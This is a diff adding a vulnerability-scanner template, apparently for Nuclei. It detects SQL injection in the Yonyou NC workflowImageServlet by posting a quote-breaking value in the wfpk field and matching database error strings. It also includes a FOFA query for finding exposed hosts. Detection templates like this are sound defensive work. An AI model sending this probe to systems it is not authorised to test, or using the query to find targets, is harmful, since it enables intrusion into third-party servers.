@@ -1,0 +1,33 @@
+http:
+- matchers:
+  - status:
+    - 500
+    type: status
+  - condition: or
+    part: body
+    type: word
+    words:
+    - "\u5F15\u53F7\u5185\u7684\u5B57\u7B26\u4E32\u6CA1\u6709\u6B63\u786E\u7ED3\u675F"
+    - quoted string not properly terminated
+  matchers-condition: and
+  raw:
+  - 'POST /portal/pt/servlet/workflowImageServlet/doPost?pageId=login HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    wfpk=1''&proInsPk=t
+
+    '
+id: yonyou-nc-workflowImageServlet-sqli
+info:
+  author: Co5mos,leadlife
+  description: Detects SQL Injection vulnerability in Yonyou NC workflowImageServlet.
+  metadata:
+    fofa-query: icon_hash="1085941792"
+  name: Yonyou NC workflowImageServlet - SQL Injection
+  reference: https://github.com/wy876/POC/commit/ee9d02fb7cece93cb920b0d4654468cc08acedd4
+  severity: high
+  tags: yonyou,sqli
